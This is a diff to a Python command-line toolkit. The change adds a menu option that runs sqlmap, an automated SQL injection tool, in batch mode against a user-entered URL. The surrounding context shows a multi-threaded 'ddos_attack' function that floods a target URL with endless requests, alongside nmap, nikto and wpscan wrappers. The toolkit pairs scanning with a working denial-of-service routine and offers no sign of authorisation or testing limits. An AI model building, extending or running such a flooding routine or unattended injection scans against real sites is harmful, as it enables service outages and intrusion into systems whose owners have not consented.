@@ -112,6 +112,15 @@ def wpscan(url):
     else:
         print("wpscan completed successfully.")
 
+def sqlmap_scan(url):
+    print(f"Running sqlmap on {url}")
+    result = subprocess.run(["sqlmap", "-u", url, "--batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    print(result.stdout.decode())
+    if result.returncode != 0:
+        print("sqlmap scan completed with errors.")
+    else:
+        print("sqlmap scan completed successfully.")
+
 def ddos_attack(url, threads=100):
     def attack():
         while True:
@@ -120,7 +129,7 @@ def ddos_attack(url, threads=100):
                 print(f"Sent request to {url}")
             except requests.RequestException as e:
                 print(f"Error: {e}")
-    
+
     print(f"Starting DDoS attack on {url} with {threads} threads")
     for _ in range(threads):
         thread = threading.Thread(target=attack)
@@ -159,7 +168,7 @@ def main():
             print(f"{domain}: Unable to find IP address")
 
     elif choice == '3':
-        scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan: ")
+        scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan, (4) sqlmap: ")
         if scan_choice == '1':
             domain = input("Please enter a domain: ")
             ip_address = get_ip_address(domain)
@@ -173,6 +182,9 @@ def main():
         elif scan_choice == '3':
             url = input("Please enter a URL to scan with wpscan: ")
             wpscan(url)
+        elif scan_choice == '4':
+            url = input("Please enter a URL to scan with sqlmap: ")
+            sqlmap_scan(url)
         else:
             print("Invalid scan type choice.")
             sys.exit(1)
